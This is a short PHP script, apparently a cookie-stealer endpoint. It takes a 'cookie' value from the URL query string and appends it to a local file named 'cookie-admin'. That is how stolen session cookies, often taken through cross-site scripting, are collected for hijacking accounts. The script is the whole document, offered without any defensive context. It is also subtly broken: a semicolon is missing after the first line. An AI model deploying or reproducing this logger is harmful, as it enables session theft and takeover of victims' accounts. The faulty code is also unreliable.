<?php

$cookie = $_GET['cookie']

$f = fopen('cookie-admin','a');
fwrite($f,'cookie: ' .$cookie. ' ');

?>